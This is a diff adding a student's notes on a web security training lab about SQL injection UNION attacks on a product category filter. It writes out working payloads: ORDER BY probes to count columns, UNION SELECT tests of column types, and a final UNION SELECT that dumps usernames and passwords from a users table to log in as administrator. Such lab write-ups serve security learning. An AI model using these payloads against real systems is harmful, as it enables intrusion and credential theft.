@@ -1,0 +1,27 @@
+lab# 5 - SQL injection UNION attack , retrieving data from other tables.
+
+SQL injection vulnerability in the product category filter.
+
+Scope: use UNION attack to retrive data from other tables
+
+database contains a different table called users> col username, password
+
+GOAL: perform UNION attack to retreives all usersnames and passwords, then use them to log as the administrator.
+
+solution analysis:
+1# determine th e number of columns
+order by 1--
+order by 2--
+order by 3-->internal error
+
+the database contains 2 columns : 3-1=2
+
+2# determine the type of data of the columns
+
+select a,b from product where category='gifts
+using: 'UNION select 'a',NULL-->no errors
+ UNION select 'a','a'-- > no error means both columns are type of string.
+
+to get the username and password> both  are sting data type.
+using:
+'UNION select username,password from users--
